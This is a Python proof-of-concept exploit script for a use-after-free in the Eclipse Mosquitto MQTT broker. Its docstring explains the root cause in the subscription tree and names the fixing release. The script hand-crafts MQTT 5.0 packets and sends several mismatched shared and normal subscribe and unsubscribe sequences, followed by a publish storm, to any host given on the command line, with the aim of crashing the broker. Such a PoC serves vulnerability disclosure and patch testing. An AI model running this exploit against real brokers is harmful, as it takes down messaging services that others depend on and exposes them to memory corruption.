#!/usr/bin/env python3
"""
CVE-2024-8376 PoC - Eclipse Mosquitto <= 2.0.18a use-after-free in the broker
subscription engine when shared ($share/...) and normal subscriptions sharing
the same root topic token are mixed via SUBSCRIBE/UNSUBSCRIBE then PUBLISH.

Root cause (src/subs.c, v2.0.18): one tree `db.subs` keyed by topics[0] holds
both shared and normal subs. sub__add() distinguishes shared/normal, but
sub__remove()/sub__messages_queue() look the node up by topics[0] only. A
mismatched remove frees a subleaf that is still referenced, so a subsequent
PUBLISH (sub__messages_queue -> sub__search) walks freed memory. Fixed in
2.0.19 by separating db.normal_subs / db.shared_subs (commit 1914b3ee).

We hand-roll MQTT 5.0 frames (no paho) and exercise several shared/normal
mismatch orderings on one connection. Any of them aims to leave a dangling
subleaf that the final PUBLISH dereferences.

Usage: python3 poc_cve_2024_8376.py [host] [port]
"""
import socket
import struct
import sys
import time

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 1883

_mid = 0


def next_mid() -> int:
    global _mid
    _mid += 1
    return _mid


def vlq(n: int) -> bytes:
    out = b""
    while True:
        b = n % 128
        n //= 128
        if n > 0:
            b |= 0x80
        out += bytes([b])
        if n == 0:
            break
    return out


def mstr(s: str) -> bytes:
    b = s.encode()
    return struct.pack(">H", len(b)) + b


def connect(cid: str) -> bytes:
    vh = b"\x00\x04MQTT" + b"\x05" + b"\x02" + struct.pack(">H", 60) + b"\x00"
    body = vh + mstr(cid)
    return bytes([0x10]) + vlq(len(body)) + body


def subscribe(topic: str) -> bytes:
    body = struct.pack(">H", next_mid()) + b"\x00"   # packet id + props len 0
    body += mstr(topic) + b"\x00"                    # filter + sub options
    return bytes([0x82]) + vlq(len(body)) + body


def unsubscribe(topic: str) -> bytes:
    body = struct.pack(">H", next_mid()) + b"\x00"   # packet id + props len 0
    body += mstr(topic)
    return bytes([0xA2]) + vlq(len(body)) + body


def publish(topic: str, payload: bytes = b"x") -> bytes:
    vh = mstr(topic) + b"\x00"                        # topic + props len 0
    body = vh + payload
    return bytes([0x30]) + vlq(len(body)) + body


def run(seq, label):
    print(f"\n=== sequence: {label} ===")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    try:
        s.connect((host, port))
    except Exception as e:
        print(f"[!] connect failed (broker may already be dead): {e}")
        return False
    s.sendall(connect(label.replace(" ", "")[:20]))
    try:
        s.recv(64)
    except Exception:
        pass
    for desc, pkt in seq:
        print(f"[*] -> {desc}")
        try:
            s.sendall(pkt)
            time.sleep(0.15)
            s.recv(256)
        except Exception:
            pass
    s.close()
    return True


def main():
    ROOT = "a"
    SHARED = "$share/g/a"
    # Several mismatch orderings; the broker should die on one of them.
    sequences = [
        ("shared-sub then normal-unsub then publish", [
            ("SUBSCRIBE $share/g/a", subscribe(SHARED)),
            ("SUBSCRIBE a (normal)", subscribe(ROOT)),
            ("UNSUBSCRIBE a (normal)", unsubscribe(ROOT)),
            ("UNSUBSCRIBE $share/g/a", unsubscribe(SHARED)),
            ("PUBLISH a", publish(ROOT)),
        ]),
        ("normal-sub, shared-sub, normal-unsub, publish", [
            ("SUBSCRIBE a (normal)", subscribe(ROOT)),
            ("SUBSCRIBE $share/g/a", subscribe(SHARED)),
            ("UNSUBSCRIBE a (normal)", unsubscribe(ROOT)),
            ("PUBLISH a", publish(ROOT)),
        ]),
        ("shared-sub, shared-unsub, normal-sub, publish", [
            ("SUBSCRIBE $share/g/a", subscribe(SHARED)),
            ("UNSUBSCRIBE $share/g/a", unsubscribe(SHARED)),
            ("SUBSCRIBE a (normal)", subscribe(ROOT)),
            ("PUBLISH a", publish(ROOT)),
        ]),
    ]
    for label, seq in sequences:
        alive = run(seq, label)
        if not alive:
            print("[+] broker stopped accepting connections -> likely crashed")
            return
    # second pass: hammer publishes to drive sub__search over any dangling leaf
    run([("PUBLISH a (x20)", publish(ROOT))] * 20, "publish-storm")
    print("\n[*] all sequences sent")


if __name__ == "__main__":
    main()
